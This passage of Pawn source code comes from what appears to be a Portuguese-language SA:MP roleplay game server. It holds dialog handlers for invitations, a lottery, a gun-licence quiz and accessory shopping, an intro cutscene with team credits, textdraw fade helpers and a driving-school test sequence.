					TextDrawColour(tdrepair, COLOUR_WHITE);
					TextDrawSetProportional(tdrepair, 1);
					TextDrawSetShadow(tdrepair, 1);

			        TextDrawShowForPlayer(playerid, tdrepair);
					VFrozenFlags[playerid] |= VFROZEN_REPAIR;
					TogglePlayerControllable(playerid, false);
					GivePlayerSysMoney(playerid, -pay);
			        SetTimerEx("Repairing", 220, false, "dddd", playerid, vehid, 0, _:tdrepair);
				}
	     	}
	     	
	     	else if(Invite[playerid] == INVITE_COMPANY)
 	    	{
 	    	    SendClientMessage(playerid, COLOUR_GOLD, "Você aceitou trabalhar na empresa.");
				format(string, sizeof string, "%s aceitou trabalhar na sua empresa.", PlayerName(playerid));
				SendClientMessage(InviteSender[playerid], COLOUR_GOLD, string);
 	    	    EmployEx(playerid, InviteParams[playerid]);
 	    	}
 	    	
 	    	else if(Invite[playerid] == INVITE_JOB)
 	    	{
 	    	    new Float:X, Float:Y, Float:Z;

				if(ArrowObject[playerid] != -1)
   				{
     				DestroyPlayerObject(playerid, ArrowObject[playerid]);
     				ArrowObject[playerid] = -1;
				}
		
				GetPlayerWorldPos(InviteParams[playerid], X, Y, Z);
				SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 5.0);
				ArrowPointTo[playerid][0] = X;
				ArrowPointTo[playerid][1] = Y;
				ArrowPointTo[playerid][2] = Z;
				ArrowObject[playerid] = CreatePlayerObject(playerid, 1318, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
				TaxiDelivery[playerid] = -1;
 	    	    SendClientMessage(playerid, COLOUR_WHITE, "Serviço atendido.");
 	    	    SendClientMessage(InviteParams[playerid], COLOUR_WHITE, "Alguém respondeu ao seu chamado.");
 	    	}
 	    	
			else if(Invite[playerid] == INVITE_CHOP)
			{
			    new vehid, value;
			    
			    vehid = (InviteParams[playerid] >> 16) & 0xFFFF;
			    value = InviteParams[playerid] & 0xFFFF;
			    
			    RemovePlayerFromVehicle(playerid);
			    DeletePlayerVehicle(vehid);
			    GivePlayerSysMoney(playerid, value);
			    SendClientMessage(playerid, COLOUR_WHITE, "Veículo desmanchado.");
			}
 	    }
 	    
 	    else
 	    {
            if(Invite[playerid] == INVITE_GANG)
 	    	{
 	    	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "Você recusou fazer parte da gangue.");
				format(string, sizeof string, "%s recusou fazer parte da sua gangue.", PlayerName(playerid));
				SendClientMessage(InviteSender[playerid], COLOUR_SKY_BLUE, string);
 	    	}
 	    	
 	    	else if(Invite[playerid] == INVITE_COMPANY)
 	    	{
                SendClientMessage(playerid, COLOUR_GOLD, "Você recusou trabalhar na empresa.");
				format(string, sizeof string, "%s recusou trabalhar na sua empresa.", PlayerName(playerid));
				SendClientMessage(InviteSender[playerid], COLOUR_GOLD, string);
 	    	}
 	    	
 	    	else if(Invite[playerid] == INVITE_JOB)
 	    	{
 	    	    SendClientMessage(playerid, COLOUR_WHITE, "Serviço recusado.");
			}
			
			else if(Invite[playerid] == INVITE_CHOP)
			{
				SendClientMessage(playerid, COLOUR_WHITE, "Serviço de desmanche recusado.");
			}
 	    }
 	    
 	    InviteSender[playerid] = INVALID_PLAYER_ID;
 	    InviteParams[playerid] = 0;
 	    Invite[playerid] = INVITE_NONE;
 	    return 1;
  	}

 	if(dialogid == DIALOG_LOTTERY)
	{
	    new string[128];
		new num1, num2, idx;
		
	    if(!response)
	    {
	        DrawTextForPlayer(playerid, "Aposta cancelada.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
	        return 0;
	    }

	    if(!strlen(inputtext))
		{
		    DrawTextForPlayer(playerid, "Digite os números.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		    ShowLotteryDialog(playerid);
			return 0;
	    }
	    
	    num1 = strval(strtok(inputtext, idx));
		num2 = strval(strtok(inputtext, idx));
		
		if(GetPlayerSysMoney(playerid) < 200)
		{
		    DrawTextForPlayer(playerid, "Dinheiro insuficiente, Custo: $200,00 dólares", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		    return 0;
		}
		
		if(num1 == 0 || num2 == 0)
		{
		    DrawTextForPlayer(playerid, "Digite os dois números.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		    ShowLotteryDialog(playerid);
			return 0;
		}
		
		if(num1 < 1 || num1 > 30 || num2 < 1 || num2 > 30)
		{
		    DrawTextForPlayer(playerid, "Números de 1 a 30.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		    ShowLotteryDialog(playerid);
			return 0;
		}
		
		if(num1 == num2)
		{
		    DrawTextForPlayer(playerid, "Números diferentes.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		    ShowLotteryDialog(playerid);
			return 0;
		}
		
		if(num1 > num2)
		{
		    num1 += num2;
			num2 = num1 - num2;
			num1 -= num2;
		}
		
		if(hGetInt(BETS_FILE_PATH, PlayerName(playerid)) != 0)
		{
		    DrawTextForPlayer(playerid, "Você já apostou.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
		    return 0;
		}
		
		GivePlayerSysMoney(playerid, -200);
		hSetInt(BETS_FILE_PATH, PlayerName(playerid), ((num1 & 0xFFFF) << 16) | (num2 & 0xFFFF));
		format(string, sizeof string, "Aposta concluida! ~n~Números apostados: %d e %d", num1, num2);
		DrawTextForPlayer(playerid, string, COLOUR_GREEN, TEXTDRAW_STYLE_2, 4000);
		return 1;
	}
 	
 	if(dialogid == DIALOG_LICENSE_GUN)
 	{
 	    new xpath[128];
 	    new lgun;
 	    
 	    xpath = GetPlayerXFilePath(playerid);
 	    lgun = hGetInt(xpath, "LicenseGun");
 	    
		switch(LGunPart[playerid])
		{
		    case 0:
		    {
		        if(!response)
		        {
		            LGunPart[playerid] = 0;
		            DrawTextForPlayer(playerid, "Teste cancelado.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		            return 0;
		        }

				if(lgun > 0)
				    ShowPlayerDialog(playerid, DIALOG_LICENSE_GUN, DIALOG_STYLE_MSGBOX, "Porte de Armas - Pergunta 1", "Você deve exibir suas armas para todos?", "Sim", "Não");
				    
				else
                	ShowPlayerDialog(playerid, DIALOG_LICENSE_GUN, DIALOG_STYLE_MSGBOX, "Porte de Armas - Pergunta 1", "Você deve atirar em um policial se ele atirar em você?", "Sim", "Não");
		    }
		    
		    case 1:
		    {
		        if(response)
		        {
		            LGunPart[playerid] = 0;
		            DrawTextForPlayer(playerid, "Resposta errada! Teste cancelado.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		            return 0;
		        }

                if(lgun > 0)
                    ShowPlayerDialog(playerid, DIALOG_LICENSE_GUN, DIALOG_STYLE_MSGBOX, "Porte de Armas - Pergunta 2", "Está ciente das penalidades acarretadas por homicidio?", "Sim", "Não");
                    
				else
                	ShowPlayerDialog(playerid, DIALOG_LICENSE_GUN, DIALOG_STYLE_MSGBOX, "Porte de Armas - Pergunta 2", "Está ciente dos usos indevidos de arma e os problemas acarretados?", "Sim", "Não");
		    }
		    
		    case 2:
		    {
		        if(!response)
		        {
		            LGunPart[playerid] = 0;
		            DrawTextForPlayer(playerid, "Resposta errada! Teste cancelado.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		            return 0;
		        }

                if(lgun > 0)
                	ShowPlayerDialog(playerid, DIALOG_LICENSE_GUN, DIALOG_STYLE_MSGBOX, "Porte de Armas - Pergunta 3", "Está ciente de que não deverá se intrometer em capturas e tiroteios, mesmo com boas intenções?", "Sim", "Não");
                
				else
                	ShowPlayerDialog(playerid, DIALOG_LICENSE_GUN, DIALOG_STYLE_MSGBOX, "Porte de Armas - Pergunta 3", "Está ciente de que só deverá utilizar uma arma apenas para auto-defesa?", "Sim", "Não");
		    }
		    
		    case 3:
		    {
		        if(!response)
		        {
		            LGunPart[playerid] = 0;
		            DrawTextForPlayer(playerid, "Resposta errada! Teste cancelado.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
		            return 0;
		        }

                if(lgun > 0)
                {
					hSetInt(xpath, "LicenseGun", 2);
					GivePlayerSysMoney(playerid, -500);
					SendClientMessage(playerid, COLOUR_WHITE, "Porte de armas CAT2 - Armas Pesadas adquirido.");
				}
				
				else
				{
                	hSetInt(xpath, "LicenseGun", 1);
                	GivePlayerSysMoney(playerid, -300);
                	SendClientMessage(playerid, COLOUR_WHITE, "Porte de armas CAT1 - Armas Leves adquirido.");
                }
                
                LGunPart[playerid] = 0;
				SendClientMessage(playerid, COLOUR_WHITE, "Lembre-se: Estamos de olho, qualquer desrespeito à essas regras irá acarretar na fiscalização de seu porte.");
				return 1;
			}
		}
		
		LGunPart[playerid]++;
 	    return 1;
 	}
 	
 	if(dialogid == DIALOG_ACCESSORIES && response)
	{
	    new id = -1;
	    new count = 0;
	    
	    for(new a = 1; a < sizeof Accessories; a++)
		{
		    if(Accessories[a][accessoryType] == AccessoryType[playerid])
		    {
		        if(count == listitem)
		        {
					id = a;
		            break;
				}
				
		        count++;
		    }
		}
		
		if(id != -1)
		{
		    if(GetPlayerSysMoney(playerid) < Accessories[id][accessoryValue])
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Dinheiro insuficiente!");
		        return 0;
		    }
		    
			GivePlayerSysMoney(playerid, -Accessories[id][accessoryValue]);
			SetPlayerAccessory(playerid, id);
			SavePlayerAccessory(playerid, AccessoryType[playerid], id);
			SendClientMessage(playerid, COLOUR_WHITE, "Acessório adquirido!");
		}
		
		return 1;
	}
	
    return 0;
}

public Introducing(playerid)
{
	if(!IsPlayerConnected(playerid) || !IsPlayerLogged(playerid))
	    return;
	    
	new time;

    time = 0;
    
	for(new ln = 0; ln < NLINES; ln++)
		SendClientMessage(playerid, COLOUR_WHITE, " ");
	
	if(IntroductionPart[playerid] <= 0)
	{
	    IntroductionPart[playerid] = 1;
	    TextDrawHideForPlayer(playerid, tdblack);
	    SetCameraBehindPlayer(playerid);
	    UpdatePlayerSpawn(playerid);
	    ShowWeekdayForPlayer(playerid);
	    TogglePlayerClock(playerid, true);
	    TogglePlayerControllable(playerid, true);
	    SetTimerEx("StartChat", 1000, false, "d", playerid);
	    return;
	}

	if(IntroductionPart[playerid] == 1)
	{
	    SetPlayerVirtualWorld(playerid, HISTORY_VIRTUAL_WORLD + playerid + 1);
        SetPlayerCameraPos(playerid, -1988.0491, 150.4515, 27.5391);
        SetPlayerCameraLookAt(playerid, -1983.3894, 152.8307, 27.6875);
		TextDrawSetString(tdintro[playerid], "Virtual Society Team presents");
		TextDrawShowForPlayer(playerid, tdintro[playerid]);
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 2)
	{
	    TogglePlayerControllable(playerid, false);
	    TextDrawSetString(tdintro[playerid], "_");
	    time = 2000;
	}
	
	else if(IntroductionPart[playerid] == 3)
	{
	    TextDrawSetString(tdintro[playerid], "A Virtual Society Team production");
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 4)
	{
	    TextDrawSetString(tdintro[playerid], "_");
	    time = 2000;
	}
	
	else if(IntroductionPart[playerid] == 5)
	{
	    TextDrawSetString(tdintro[playerid], "Project Leaders:~n~Saturnus~n~Texugo~n~Michael");
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 6)
	{
	    TextDrawSetString(tdintro[playerid], "_");
	    time = 2000;
	}
	
	else if(IntroductionPart[playerid] == 7)
	{
	    TextDrawSetString(tdintro[playerid], "Virtual Society Team:~n~Guilherme~n~Osorkon~n~Brutows~n~Manny~n~Paulo");
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 8)
	{
	    TextDrawSetString(tdintro[playerid], "_");
	    time = 2000;
	}
	
	else if(IntroductionPart[playerid] == 9)
	{
	    TextDrawSetString(tdintro[playerid], "Special Thanks:~n~Rockstar Games~n~SA:MP Team~n~Brazucas'Server");
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 10)
	{
	    TextDrawSetString(tdintro[playerid], "_");
	    time = 2000;
	}
	
	else if(IntroductionPart[playerid] == 11)
	{
	    TextDrawLetterSize(tdintro[playerid], 1.8, 5.0);
	    TextDrawSetString(tdintro[playerid], "~b~Virtual ~y~~h~Society ~w~R~y~~h~P~b~G");
		TextDrawShowForPlayer(playerid, tdintro[playerid]);
		time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 12)
	{
	    TextDrawHideForPlayer(playerid, tdintro[playerid]);
	    time = 1500;
	}
	
	else if(IntroductionPart[playerid] == 13)
	{
	    ShowLogoForPlayer(playerid);
	    DissolveTextBlack(playerid, 0xFF);
        time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 14)
	{
		TextDrawLetterSize(tdintro[playerid], 0.5, 1.5);
        TextDrawSetString(tdintro[playerid], "San Fierro - Cranberry Station - 1993");
        TextDrawShowForPlayer(playerid, tdintro[playerid]);
        SetPlayerCellPhoneAction(playerid);
		time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 15)
	{
	    TextDrawSetString(tdintro[playerid], "_");
	    TextDrawSetString(tdchat[playerid], "Alo!");
		TextDrawShowForPlayer(playerid, tdchat[playerid]);
	    time = 1000;
	}
	
	else if(IntroductionPart[playerid] == 16)
	{
		TextDrawSetString(tdchat[playerid], "~b~Hei, cara, como vai?");
	    time = 2000;
	}
	
	else if(IntroductionPart[playerid] == 17)
	{
		TextDrawSetString(tdchat[playerid], "Heei, Rafael, tudo bem, mas poderia ~n~estar melhor...");
	    time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 18)
	{
		TextDrawSetString(tdchat[playerid], TEXT("~b~Pois é, sinto muito pelo que houve, ~n~vou sentir sua falta amigo..."));
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 19)
	{
		TextDrawSetString(tdchat[playerid], TEXT("Eu também vou, ser expulso de Liberty City, ~n~não poderia ter sido pior para mim..."));
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 20)
	{
		TextDrawSetString(tdchat[playerid], TEXT("~b~Ah cara, estes mafiosos vão pagar algum dia. ~n~Eai, já fez planos?"));
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 21)
	{
		TextDrawSetString(tdchat[playerid], TEXT("Sim, estou em San Fierro, vou pegar um avião e ~n~recomeçar minha vida em Los Santos."));
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 22)
	{
		TextDrawSetString(tdchat[playerid], "~b~Hmm, boa sorte amigo, vou realmente sentir ~n~sua falta.");
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 23)
	{
		TextDrawSetString(tdchat[playerid], TEXT("Eu também, Rafael... Até mais, amigo, mande ~n~abraços ao Jairo por mim!"));
	    time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 24)
	{
		TextDrawSetString(tdchat[playerid], TEXT("~b~OK, até mais..."));
	    time = 2000;
	}
	
	else if(IntroductionPart[playerid] == 25)
	{
	    SetPlayerVirtualWorld(playerid, HISTORY_VIRTUAL_WORLD);
	    TextDrawSetString(tdchat[playerid], "_");
	    StopPlayerCellPhoneAction(playerid);
		time = 2000;
	}

	else if(IntroductionPart[playerid] == 26)
	{
	    SetPlayerCameraPos(playerid, -1982.8894, 153.3307, 27.6875);
        SetPlayerCameraLookAt(playerid, -1994.0032, 157.1385, 27.3179);
		time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 27)
	{
	    SolveTextBlack(playerid, 0);
		time = 2500;
	}
	
	else if(IntroductionPart[playerid] == 28)
	{
	    DissolveTextBlack(playerid, 0xFF);
	    PutPlayerInVehicle(playerid, TAXI_HISTORY[1], 2);
	    SetPlayerCameraPos(playerid, -1452.4569, -277.4644, 13.6411);
        SetPlayerCameraLookAt(playerid, -1447.8182,	-281.7279, 13.7789);
		time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 29)
	{
	    TextDrawSetString(tdchat[playerid], "Valeu, parceiro");
	    RemovePlayerFromVehicle(playerid);
	    time = 4000;
	}
	
	else if(IntroductionPart[playerid] == 30)
	{
	    TextDrawSetString(tdchat[playerid], "_");
	    SetPlayerCameraPos(playerid, -1447.8805, -285.5394, 15.0000);
        SetPlayerCameraLookAt(playerid, -1442.6841, -275.5715, 15.1484);
        SetPlayerFacingAngle(playerid, 337.5115);
	    time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 31)
	{
	    SolveTextBlack(playerid, 0);
		time = 2500;
	}
	
	else if(IntroductionPart[playerid] == 32)
	{
	    SetPlayerVirtualWorld(playerid, HISTORY_VIRTUAL_WORLD + playerid + 1);
	    SetPlayerPos(playerid, 1686.0055, -2239.6494, 13.5469);
	    SetPlayerFacingAngle(playerid, 176.8181);
		SetPlayerCameraPos(playerid, 1589.3588, -2300.8518, 13.5336);
        SetPlayerCameraLookAt(playerid, 1626.7275, -2332.2927, 13.5469);
        DissolveTextBlack(playerid, 0xFF);
        TextDrawSetString(tdintro[playerid], "Los Santos International Airport - 1993");
        time = 7500;
	}
	
	else if(IntroductionPart[playerid] == 33)
	{
	    TextDrawHideForPlayer(playerid, tdintro[playerid]);
	    SetPlayerVirtualWorld(playerid, 0);
		SetPlayerCameraPos(playerid, 1702.7306, -2240.2883, 13.5396);
        SetPlayerCameraLookAt(playerid, 1686.0055, -2239.6494, 13.5469);
        IntroductionPart[playerid] = -1;
        time = 4000;
	}
	
	++IntroductionPart[playerid];
 	SetTimerEx("Introducing", time, false, "d", playerid);
}

public StartChat(playerid)
{
    if(!IsPlayerConnected(playerid) || !IsPlayerLogged(playerid))
	    return;
	    
	new time;
	    
	if(IntroductionPart[playerid] <= 0)
	{
	    TextDrawSetString(tdchat[playerid], "_");
	    TextDrawHideForPlayer(playerid, tdchat[playerid]);
	    return;
	}
	
	if(IntroductionPart[playerid] == 1)
	{
    	TextDrawSetString(tdchat[playerid], TEXT("Ahhh, Los Santos, a melhor cidade para ~n~quem está quebrado..."));
    	time = 4000;
    }
    
	else if(IntroductionPart[playerid] == 2)
	{
	    TextDrawSetString(tdchat[playerid], TEXT("A partir de hoje vou começar uma nova vida."));
    	time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 3)
	{
	    TextDrawSetString(tdchat[playerid], "Vou do fracasso para o sucesso.");
    	time = 2000;
	}
	
	else if(IntroductionPart[playerid] == 4)
	{
	    TextDrawSetString(tdchat[playerid], TEXT("Mas antes, é claro, preciso de um taxi."));
    	time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 5)
	{
	    TextDrawSetString(tdchat[playerid], "~y~~h~Para chamar um taxi digite ~b~~h~/servico taxi");
    	time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 6)
	{
	    TextDrawSetString(tdchat[playerid], TEXT("~y~~h~Você poderá usar o comando ~b~~h~/servico ~y~~h~apenas agora."));
    	time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 7)
	{
	    TextDrawSetString(tdchat[playerid], TEXT("~y~~h~Posteriormente, terá que comprar um celular."));
    	time = 3000;
	}
	
	else if(IntroductionPart[playerid] == 8)
	{
	    TextDrawSetString(tdchat[playerid], TEXT("~y~~h~Digite ~b~~h~/tutorial ~y~~h~para aprender como começar."));
	    IntroductionPart[playerid] = -1;
	    StopAudioStreamForPlayer(playerid);
    	time = 3000;
	}
	
	++IntroductionPart[playerid];
 	SetTimerEx("StartChat", time, false, "d", playerid);
}

public Text:CreateDrawText(content[], colour, style)
{
    new Text:td;
	new Float:X, Float:Y, Float:sizeX, Float:sizeY;
	new font, shadow, alignment;
	
    switch(style)
	{
	    case TEXTDRAW_STYLE_1:
	        X = 320.0, Y = 130.0, font = 1, sizeX = 0.7, sizeY = 2.0, shadow = 1, alignment = 2;

		case TEXTDRAW_STYLE_2:
		    X = 318.0, Y = 309.0, font = 1, sizeX = 0.5, sizeY = 1.5, shadow = 1, alignment = 2;

        case TEXTDRAW_STYLE_3:
		    X = 318.0, Y = 309.0, font = 2, sizeX = 0.4, sizeY = 1.7, shadow = 1, alignment = 2;

        case TEXTDRAW_STYLE_4:
		    X = 318.0, Y = 309.0, font = 1, sizeX = 0.4, sizeY = 1.7, shadow = 1, alignment = 2;

        case TEXTDRAW_STYLE_5:
		    X = 320.0, Y = 130.0, font = 1, sizeX = 0.5, sizeY = 1.5, shadow = 1, alignment = 2;

        case TEXTDRAW_STYLE_6:
		    X = 370.0, Y = 400.0, font = 1, sizeX = 0.5, sizeY = 1.5, shadow = 1, alignment = 2;

        case TEXTDRAW_STYLE_7:
		    X = 606.0, Y = 126.0, font = 1, sizeX = 0.3, sizeY = 1.1, shadow = 1, alignment = 3;
	}

	td = TextDrawCreate(X, Y, TEXT(content));
	TextDrawColour(td, colour);
	TextDrawFont(td, font);
	TextDrawLetterSize(td, sizeX, sizeY);
	TextDrawSetShadow(td, shadow);
	TextDrawAlignment(td, alignment);
	return td;
}

public DrawTextForPlayer(playerid, content[], colour, style, time)
{
	new Text:td;
	
	td = CreateDrawText(content, colour, style);
	TextDrawShowForPlayer(playerid, td);
	SetTimerEx("DestroyTextDraw", time, false, "dd", _:td, playerid);
}

public DrawTextForPlayers(content[], colour, style, time, ...)
{
	new Text:td;
	new nargs, playa;

	td = CreateDrawText(content, colour, style);
	nargs = numargs();
	
	for(new n = 0; n < nargs; n++)
	{
		playa = getarg(n);
		
		if(IsPlayerConnected(playa))
		{
			TextDrawShowForPlayer(playa, td);
			SetTimerEx("HideTextDraw", time + (n * 5), false, "dd", _:td, playa);
		}
	}
	
	SetTimerEx("DestroyTextDraw", time + (nargs * 5), false, "dd", _:td, -255);
}

public DrawTextForAll(content[], colour, style, time)
{
	new Text:td;

	td = CreateDrawText(content, colour, style);
	TextDrawShowForAll(td);
	SetTimerEx("DestroyTextDraw", time, false, "dd", _:td, INVALID_PLAYER_ID);
}

public DrawCustomTextForPlayer(playerid, content[], colour, Float:X, Float:Y, font, Float:sizeX, Float:sizeY, shadow, alignment, time)
{
	new Text:td;

	td = TextDrawCreate(X, Y, TEXT(content));
	TextDrawColour(td, colour);
	TextDrawFont(td, font);
	TextDrawLetterSize(td, sizeX, sizeY);
	TextDrawSetShadow(td, shadow);
	TextDrawAlignment(td, alignment);
    TextDrawShowForPlayer(playerid, td);
	SetTimerEx("DestroyTextDraw", time, false, "dd", _:td, playerid);
}

public HideTextDraw(textid, playerid)
	TextDrawHideForPlayer(playerid, Text:textid);

public DestroyTextDraw(textid, playerid)
{
	if(playerid != -255)
	{
		if(playerid != INVALID_PLAYER_ID)
    		TextDrawHideForPlayer(playerid, Text:textid);
    	
		else
		    TextDrawHideForAll(Text:textid);
	}
	
	TextDrawDestroy(Text:textid);
}

public SolveTextBlack(playerid, alpha)
{
	new nalpha;

	nalpha = alpha + 0x11;
	
	if(nalpha > 0xEE)
	{
	    TextDrawHideForPlayer(playerid, tdblack);
	    TextDrawBoxColour(tdblack, 0x000000FF);
	    TextDrawShowForPlayer(playerid, tdblack);
	    return;
	}
	
	TextDrawHideForPlayer(playerid, tdblack);
	TextDrawBoxColour(tdblack, 0x00 | nalpha);
	TextDrawShowForPlayer(playerid, tdblack);
	
	SetTimerEx("SolveTextBlack", 110, false, "dd", playerid, nalpha);
}

public DissolveTextBlack(playerid, alpha)
{
	new nalpha;

	nalpha = alpha - 0x11;
	
	if(nalpha < 0x11)
	{
	    TextDrawHideForPlayer(playerid, tdblack);
	    TextDrawBoxColour(tdblack, 0x000000FF);
	    return;
	}
	
	TextDrawHideForPlayer(playerid, tdblack);
	TextDrawBoxColour(tdblack, 0x00 | nalpha);
	TextDrawShowForPlayer(playerid, tdblack);
	
	SetTimerEx("DissolveTextBlack", 110, false, "dd", playerid, nalpha);
}

public DissolveTextWhite(playerid, alpha)
{
	new nalpha;

	nalpha = alpha - 0x11;

	if(nalpha < 0x11)
	{
	    TextDrawHideForPlayer(playerid, tdwhite);
	    TextDrawBoxColour(tdwhite, 0xFFFFFFFF);
	    return;
	}

	TextDrawHideForPlayer(playerid, tdwhite);
	TextDrawBoxColour(tdwhite, 0xFFFFFF00 | nalpha);
	TextDrawShowForPlayer(playerid, tdwhite);

	SetTimerEx("DissolveTextWhite", 110, false, "dd", playerid, nalpha);
}

public ShowTextRed(playerid)
{
	TextDrawShowForPlayer(playerid, tdred);
}

public HideTextRed(playerid)
{
    TextDrawHideForPlayer(playerid, tdred);
}

public ShowTextGray(playerid)
{
	HideTextGray(playerid);
	TextDrawShowForPlayer(playerid, tdgray);
}

public HideTextGray(playerid)
{
    TextDrawHideForPlayer(playerid, tdgray);
}

public ShowTextLightGray(playerid)
{
	HideTextLightGray(playerid);
	TextDrawShowForPlayer(playerid, tdlightgray);
}

public HideTextLightGray(playerid)
{
    TextDrawHideForPlayer(playerid, tdlightgray);
}


public ContinueFromLastPos(playerid)
{
	DeleteTimer(ContinueTimer[playerid]);
	hUnset(GetPlayerXFilePath(playerid), "LastPos");
	SendClientMessage(playerid, COLOUR_WHITE, "Tempo para continuar na posição onde parou esgotado.");
}

public LicenseTestT()
{
	new id;
	
	id = TestPlayerT;
	
	if(id == INVALID_PLAYER_ID || !IsPlayerConnected(id) || !IsPlayerLogged(id))
	    return;
	    
	if(TestChancesT == 0)
	{
	    SendClientMessage(id, COLOUR_RED, "Você falhou no seu teste... Todas as chances foram perdidas!");
		
	    for(new dsc = 0; dsc < sizeof DRIVING_SCHOOL_CAR; dsc++)
	    {
	        SetVehicleToRespawn(DRIVING_SCHOOL_CAR[dsc]);
	        SetVehicleParamsForPlayer(DRIVING_SCHOOL_CAR[dsc], id, 0, 1);
	    }

	    TestPlayerT = INVALID_PLAYER_ID;
	    TestPartT = 0;
	    DeleteTimer(TestTimerT);
	    SetPlayerPos(id, 1746.6401, -2061.8796, 13.5998);
	}
	
	else if(TestPartT == 0)
	{
	    SetPlayerInterior(id, 0);

	    for(new dsc = 0; dsc < sizeof DRIVING_SCHOOL_CAR; dsc++)
		{
		    SetVehicleToRespawn(DRIVING_SCHOOL_CAR[dsc]);
		    SetVehicleParamsForPlayer(DRIVING_SCHOOL_CAR[dsc], id, 0, 0);
		}

		if(!!TestTimerT)
			DeleteTimer(TestTimerT);

		TestTimerT = SetTimer("CheckTestT", 2250, true);
        TogglePlayerControllable(id, true);
		SetPlayerPos(id, 1746.6401, -2061.8796, 13.5998);
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Primeiro Teste: Baliza.");
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Coloque esse veículo em seu lado entre os dois à sua frente.");
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Lembre-se de que ele deve ficar no mesmo ângulo.");
	}
	
	else if(TestPartT == 1)
	{
	    TogglePlayerControllable(id, true);
	    SetPlayerPos(id, 1769.4495, -2020.7175, 14.1371);
	    SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Segundo Teste: Direção na pista.");
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Chegue ao fim da pista, sem colidir com os cones.");
	}
	
	else if(TestPartT == 2)
	{
	    TogglePlayerControllable(id, true);
	    SetPlayerPos(id, 1782.2482, -2041.4044, 13.5332);
	    SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Terceiro Teste: Curva de 180 graus.");
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Passe pela curva sem colidir com os cones.");
	}
	
	else if(TestPartT == 3)
	{
	    TogglePlayerControllable(id, true);
	    SetPlayerPos(id, 1770.1658, -2055.2468, 13.5829);
	    SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Quarto Teste: Zig-Zag de Moto.");
		SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Faça Zig-Zag nos cones até chegar ao fim, procure não colidir com eles.");
	}
	
	else if(TestPartT == 4)
	{
	    TestCountT = GetTickCount();
	    DisablePlayerRaceCheckpoint(id);
	    SetPlayerRaceCheckpoint(id, 1, 2423.5527, -1229.9398, 24.8702, 0.0, 0.0, 0.0, 4.0);
	    SetPlayerPos(id, 1806.0035, -2064.2908, 13.5606);
	    PlayerPlaySound(id, 1052, 0.0, 0.0, 0.0);
	    TogglePlayerControllable(id, true);
		DeleteTimer(TestTimerT);
	    SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Quinto Teste (Teste Final): Passeio pelas ruas.");
	    SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Este é um teste fora da Auto Escola, você agora vai por em prática suas habilidades de direção na rua.");
        SendClientMessage(id, COLOUR_RED, "[AUTO ESCOLA] Siga o CheckPoint, a Boate é o destino, você tem 2min, não leve multa nem danifique o veículo.");
	}
	
	else if(TestPartT == 5)
	{
	    new vehid, count;
		new Float:H;
        new bool:car;
        
        vehid = GetPlayerVehicleID(id);
        GetVehicleHealth(vehid, H);
		count = GetTickCount() - TestCountT;
		car = false;

        DisablePlayerRaceCheckpoint(id);
        
		if(GetVehicleModel(vehid) == 410)
		{
			for(new dsc = 0; dsc < sizeof DRIVING_SCHOOL_CAR; dsc++)
			{
			    if(vehid == DRIVING_SCHOOL_CAR[dsc])
			        car = true;
			}
		}

		if(GetPlayerState(id) != PLAYER_STATE_DRIVER || !car || H < 950 || count > 120000)
		{
		    if(GetPlayerState(id) != PLAYER_STATE_DRIVER)
		        SendClientMessage(id, COLOUR_RED, "Teste falhado... Você não está dirigindo nenhum veículo");

		    else if(H < 950)
				SendClientMessage(id, COLOUR_RED, "Teste falhado... O veículo está danificado!");

			else if(!car)
			    SendClientMessage(id, COLOUR_RED, "Teste falhado... Você não está no veículo correto!");

			else if(count > 120000)
                SendClientMessage(id, COLOUR_RED, "Teste falhado... Você não chegou no tempo correto (2min).");

			TestChancesT--;
			
		    if(TestChancesT == 0)
		        SendClientMessage(id, COLOUR_RED, "Seu teste falhou... Você perdeu todas suas chances!");

		    else
		    {
		        new string[128];
		        
		        TestPartT--;
